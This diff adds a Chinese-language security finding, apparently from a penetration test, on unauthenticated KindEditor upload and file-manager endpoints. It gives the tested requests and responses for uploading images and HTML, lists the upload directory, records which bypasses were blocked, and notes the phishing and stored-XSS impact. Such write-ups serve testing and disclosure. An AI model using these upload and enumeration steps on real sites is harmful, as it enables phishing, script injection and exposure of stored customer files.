@@ -1,0 +1,23 @@
+## 入口
+- `POST /Public/main/js/kindeditor/php/upload_json.php?dir=image|file`
+- `GET  /Public/main/js/kindeditor/php/file_manager_json.php`
+- 无任何 Cookie/Token 校验；上传落点 `/Upload/<dir>/YYYYMMDD/<时间戳>_<随机>.ext`
+- 上传回显里的 host 泄露站点配置域名（本例 `target480.example.com`）
+
+## 实测回显
+```
+POST ...?dir=image  multipart imgFile=@probe604.jpg;type=image/jpeg
+→ 200/91B {"error":0,"url":"http://target480.example.com/Upload/image/20261029/20261029025332_69694.jpg"}
+GET  /Upload/image/20261029/20261029025332_69694.jpg → 200 image/jpeg 正文 MARKER604IMG
+POST ...?dir=file   multipart imgFile=@m604.html;type=text/html
+→ {"error":0,"url":"http://target480.example.com/Upload/file/20261029/20261029025444_25468.html"} → 回读 200 text/html
+GET  file_manager_json.php → {"current_url":"/Upload/","total_count":12,"file_list":[{"filename":"List"},{"filename":"qrcode"},{"filename":"vlive"}...]}
+```
+
+## 边界（已实测证否的部分）
+- 扩展名白名单生效：`.php/.phtml/.php5/.pht/.PHP/.jpg.php` 全部 `error:1 扩展名是不允许的`
+- 目录穿越被拦：`dir=../../App/Tpl/Home` → `目录名不正确。`；`file_manager path=../../../` → `Access is not allowed.`
+- `/Upload/` 下不解析 PHP：`.jpg` 内嵌 PHP 后经 `...jpg/x.php` 访问 404
+
+## 影响
+任意人可在该站主域下托管任意 HTML（同源钓鱼页、存储型 XSS 载体）、落地图片/文档，并枚举业务上传目录（客户二维码、录像、开奖图等）。
